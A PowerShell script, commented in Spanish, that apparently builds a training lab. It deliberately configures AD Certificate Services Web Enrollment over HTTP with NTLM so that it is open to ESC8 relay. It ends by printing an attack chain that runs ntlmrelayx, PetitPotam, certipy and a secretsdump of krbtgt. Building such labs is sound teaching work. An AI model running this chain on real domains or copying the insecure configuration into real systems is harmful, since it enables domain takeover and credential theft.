#Requires -RunAsAdministrator
<#
.SYNOPSIS
    dc01 - instala ADCS con Web Enrollment y lo deja en la configuracion que
    habilita ESC8 (relay NTLM a la inscripcion web sobre HTTP).

.DESCRIPTION
    ESC8 no es un bug de memoria: es una combinacion de configuracion.

        - Web Enrollment expuesto sobre HTTP (sin TLS)
        - autenticacion NTLM habilitada
        - una plantilla que las cuentas de equipo pueden inscribir
        - coaccion de autenticacion (PetitPotam) contra el DC

    Valores: config/lab.env si esta disponible; parametros si no.

.EXAMPLE
    .\adcs-esc8.ps1
#>
[CmdletBinding()]
param(
    [string] $DomainName,
    [string] $DcIp,
    [string] $SvcUser,
    [string] $SvcPassword
)

$ErrorActionPreference = 'Stop'

$lib = Join-Path $PSScriptRoot '..\config\lab.ps1'
if (-not (Test-Path -LiteralPath $lib)) {
    throw ('No se encontro config\lab.ps1. Copia la carpeta config\ junto a windows\ ' +
           'en la VM (ver GUIDE.md).')
}
. $lib
$cfg = Import-BifrostLabConfig -Root $PSScriptRoot

$DomainName  = Resolve-BifrostSetting $DomainName  'BIFROST_DOMAIN'   -Config $cfg -Required
$DcIp        = Resolve-BifrostSetting $DcIp        'BIFROST_IP_DC'    -Config $cfg -Required
$SvcUser     = Resolve-BifrostSetting $SvcUser     'BIFROST_SVC_USER' -Config $cfg -Required
$SvcPassword = Resolve-BifrostSetting $SvcPassword 'BIFROST_SVC_PASS' -Config $cfg -Required

function Write-Step { param([string]$Text) Write-Host "`n== $Text" -ForegroundColor Cyan }
function Write-Ok   { param([string]$Text) Write-Host "   [ OK ] $Text" -ForegroundColor Green }

# --------------------------------------------------------------------------- #
# 1. Caracteristicas de Windows
# --------------------------------------------------------------------------- #
Write-Step 'Instalando caracteristicas'
$features = @(
    'Web-Server',
    'Web-WebSockets',
    'Web-Asp-Net45',
    'Web-Windows-Auth',
    'Web-Mgmt-Console',
    'ADCS-Cert-Authority',
    'ADCS-Web-Enrollment'
)

$result = Install-WindowsFeature -Name $features -IncludeManagementTools
if ($result.RestartNeeded) {
    Write-Host '   Se requiere reinicio; vuelve a lanzar el script despues.' -ForegroundColor Yellow
    exit 0
}
Write-Ok 'IIS + ADCS instalados'

# --------------------------------------------------------------------------- #
# 2. CA empresarial raiz
# --------------------------------------------------------------------------- #
Write-Step 'Configurando la autoridad de certificacion'

$caRunning = $false
try { $caRunning = (Get-Service -Name CertSvc -ErrorAction Stop).Status -eq 'Running' } catch { }

if (-not $caRunning) {
    Install-AdcsCertificationAuthority `
        -CAType EnterpriseRootCA `
        -CryptoProviderName 'RSA#Microsoft Software Key Storage Provider' `
        -KeyLength 2048 `
        -HashAlgorithmName SHA256 `
        -ValidityPeriod Years `
        -ValidityPeriodUnits 10 `
        -Force
    Write-Ok 'Enterprise Root CA instalada'
}
else {
    Write-Ok 'CA ya estaba instalada'
}

# --------------------------------------------------------------------------- #
# 3. Web Enrollment
# --------------------------------------------------------------------------- #
Write-Step 'Instalando Web Enrollment'
# OJO: comprobar C:\Windows\System32\CertSrv\CertEnroll NO sirve: lo crea el CA.
# Lo correcto es comprobar la aplicacion /CertSrv en IIS.
Import-Module WebAdministration -ErrorAction SilentlyContinue
$certsrvApp = Get-WebApplication -Site 'Default Web Site' -ErrorAction SilentlyContinue |
    Where-Object { $_.Path -eq '/CertSrv' }
if (-not $certsrvApp) {
    try {
        Install-AdcsWebEnrollment -Force
    }
    catch {
        # Si quedo a medias (p. ej. el CA aun no estaba configurado), el cmdlet
        # responde "role is already installed": se resetea el role y se repite.
        Write-Host '   Web Enrollment a medias; reiniciando el role ...' -ForegroundColor Yellow
        Uninstall-AdcsWebEnrollment -Force -ErrorAction SilentlyContinue
        Install-AdcsWebEnrollment -Force
    }
    Write-Ok 'Web Enrollment instalado'
}
else {
    Write-Ok 'Web Enrollment ya presente'
}

# --------------------------------------------------------------------------- #
# 4. La configuracion que crea ESC8
# --------------------------------------------------------------------------- #
Write-Step 'Aplicando configuracion vulnerable (ESC8)'

Import-Module WebAdministration
$site = 'Default Web Site/Certsrv'

# Anonimo fuera: la inscripcion debe pedir credenciales.
Set-WebConfigurationProperty -PSPath 'IIS:\' -Location $site `
    -Filter 'system.webServer/security/authentication/anonymousAuthentication' `
    -Name enabled -Value $false

# NTLM dentro: es lo que se puede retransmitir.
Set-WebConfigurationProperty -PSPath 'IIS:\' -Location $site `
    -Filter 'system.webServer/security/authentication/windowsAuthentication' `
    -Name enabled -Value $true

# Sin TLS: la pieza que convierte una configuracion en un hallazgo.
Set-WebConfigurationProperty -PSPath 'IIS:\' -Location $site `
    -Filter 'system.webServer/security/access' `
    -Name sslFlags -Value 'None'

Write-Ok 'Certsrv: anonimo OFF, NTLM ON, SSL requerido OFF'

# --------------------------------------------------------------------------- #
# 5. Verificacion
# --------------------------------------------------------------------------- #
Write-Step 'Verificando'

Restart-Service W3SVC -ErrorAction SilentlyContinue
Start-Sleep -Seconds 3

$httpOk = $false
try {
    # 401 sin credenciales es el resultado correcto: el endpoint existe y pide
    # autenticacion, pero no exige TLS.
    $response = Invoke-WebRequest -Uri 'http://localhost/certsrv/' -UseBasicParsing `
        -MaximumRedirection 0 -ErrorAction Stop
    $httpOk = $response.StatusCode -in 200, 401
}
catch {
    $code = $null
    if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
    $httpOk = $code -in 200, 401
}

if ($httpOk) { Write-Ok 'http://localhost/certsrv/ responde sobre HTTP' }
else { Write-Host '   ADVERTENCIA: certsrv no responde sobre HTTP. Revisa IIS y el firewall.' -ForegroundColor Yellow }

Write-Step 'Verificando plantillas de inscripcion'
try {
    $templates = certutil -CATemplates 2>$null
    foreach ($t in @('DomainController', 'DomainControllerAuthentication', 'Machine')) {
        if ($templates -match [regex]::Escape($t)) { Write-Ok "Plantilla disponible: $t" }
    }
}
catch { }

Write-Host @"

============================================================================
 dc01 con ADCS listo (vulnerable a ESC8 por diseno)
   Web Enrollment : http://$DcIp/certsrv/
   Autenticacion  : NTLM, sin TLS
   Plantilla      : DomainController (permite inscribir a DC01$)

 Cadena (desde el HOST atacante, como $SvcUser):
   1. ntlmrelayx.py -t http://$DcIp/certsrv/certfnsh.asp \
         -smb2support --adcs --template DomainController
   2. PetitPotam.py -u $SvcUser -p '<password>' -d $DomainName \
         <LHOST> $DcIp
   3. certipy auth -pfx dc01.pfx -dc-ip $DcIp
   4. secretsdump.py -just-dc-user krbtgt <dominio>/DC01\$@$DcIp -hashes ...
   (detalle: GUIDE.md, puente 4)
============================================================================
"@ -ForegroundColor Green
